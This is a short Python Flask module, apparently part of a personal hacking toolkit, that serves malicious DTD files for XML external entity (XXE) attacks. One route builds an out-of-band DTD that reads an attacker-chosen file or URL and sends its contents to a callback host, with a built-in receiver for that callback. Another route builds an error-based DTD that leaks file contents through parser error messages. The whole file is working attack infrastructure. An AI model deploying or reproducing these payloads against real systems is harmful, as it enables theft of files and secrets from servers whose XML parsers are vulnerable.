from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response

xxe_bp = Blueprint('xxe_bp', __name__,
                    template_folder='meuk/templates',
                    static_folder='meuk/static')

@xxe_bp.route("/ionet/yolo.dtd", methods=["GET"])
def oob():
    callback = 'https://jan-karel.nl/ionet/froufrou'
    if request.args.get('request'):
        if request.args.get('callback'):
            callback = request.args.get('callback')

        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('request') + '"><!ENTITY % eval "<!ENTITY &#x25; yolo SYSTEM \'' + callback + '/?hatseflats=%ext;\'>">%eval;%oob;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#xxe callback
@xxe_bp.route("/ionet/froufrou", methods=["GET"])
def froufrou():
    return '[!] Tot ziens en bedankt voor de Vis'



@xxe_bp.route("/ionet/fout.dtd", methods=["GET"])
def error():
    if request.args.get('resource'):
        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%ext;\'>">%eval;%error;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
